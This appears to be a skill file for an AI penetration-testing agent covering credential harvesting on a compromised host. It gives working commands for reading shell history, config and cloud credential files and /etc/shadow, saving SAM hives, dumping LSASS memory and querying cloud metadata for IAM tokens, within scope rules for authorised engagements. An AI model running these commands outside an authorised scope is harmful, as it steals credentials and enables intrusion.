---
name: credential-access-overview
description: Non-AD credential harvesting from a host you already have a shell on — OS credential stores, memory, config files, and cloud metadata. Use when you have any foothold and need credentials to escalate or move laterally. Do not use for domain-scoped attacks (Kerberoasting, DCSync) — see active-directory instead.
phases: [credential-access, post-exploitation]
tags: [credentials, dpapi, lsass, cloud-metadata]
mitre: [T1555, T1003, T1552, T1552.005]
requires_tools: [lazagne, impacket-secretsdump]
---

Once you have a shell, credentials are usually lying around — config files, shell history,
browser stores, or process memory — before any active attack is needed. Check the cheap,
passive sources first.

## Config files and history (any OS, check first — zero risk)

```
grep -riE "password|secret|api[_-]?key|token" ~/.bash_history ~/.zsh_history 2>/dev/null
find / -name "*.env" -o -name "config.yml" -o -name "credentials" 2>/dev/null | grep -v /proc
cat ~/.ssh/config ~/.aws/credentials ~/.docker/config.json 2>/dev/null
```
Application config (web app `.env`/`settings.py`, database connection strings, CI/CD secrets in
`.git/config` or a Jenkins/GitLab credential store on a build host) is frequently how the first
credential of an engagement actually appears — not a dumper tool.

## Windows — SAM/LSA/DPAPI

```
reg save HKLM\SAM sam.hive; reg save HKLM\SYSTEM system.hive     # then offline with secretsdump
secretsdump.py -sam sam.hive -system system.hive LOCAL           # local account hashes
```
**LSASS memory** holds cached logon credentials/tickets for every logged-in user — the highest-
value single target on a Windows host. Prefer a **minidump + offline parse** over a
`mimikatz`-style live read (quieter, and mimikatz itself is a Windows binary with no Linux-side
equivalent to invoke from this platform's operator box):
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full
```
then pull `lsass.dmp` back and parse offline (`pypykatz lsa minidump lsass.dmp`).

**DPAPI** protects Credential Manager entries, saved browser logins, and Wi-Fi profiles behind a
key derived from the user's login password/hash — decrypt with the recovered master key rather
than treating each DPAPI blob as independently protected:
```
python3 dpapi.py masterkey -file <masterkey_blob> -password <PASS>       # or -pvk with DC's DPAPI backup key
```

## Linux — files, keys, and memory

```
sudo cat /etc/shadow                        # if privesc already happened
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null   # private keys, often unencrypted
cat ~/.config/gcloud/credentials.db ~/.kube/config 2>/dev/null   # cloud/orchestration creds
strings /proc/<pid>/environ                 # env-var secrets (DB_PASSWORD, API_KEY) per process
```
An unencrypted SSH private key found on one host is a lateral-movement primitive, not just a
credential-access finding — pivot with it immediately (see `lateral-movement`).

## Cloud instance metadata (IMDS)

A web app with SSRF, or any shell on a cloud instance, can usually pull the instance's own IAM
role credentials — often the single highest-impact credential on a cloud engagement:
```
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>   # AWS IMDSv1
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>   # IMDSv2
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token   # GCP
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"   # Azure
```
If IMDSv2 (token-required) isn't enforced, an SSRF that can't set custom headers can still reach
IMDSv1 directly — check this before concluding metadata access is blocked.

## Grading

Credential-access findings default to **inferred** until used: a found password/key/token is
only **observed** impact once you've authenticated with it against something real (see
`shared/finding-confidence`). A `.env` file with a database password is not, by itself, proof of
database access.

## Do not

- Dump LSASS/SAM on a host where the engagement scope doesn't cover credential-access techniques
  — check `shared/governance-rules` first; this class of action has no system-enforced gate on
  the `platform_shell` path, the judgment is yours.
- Treat a found credential as the deliverable — the finding is what it grants access to, proven,
  not the credential string itself.
- Exfiltrate real secret values into a report — reference where they were found and what they
  granted; redact the actual value.
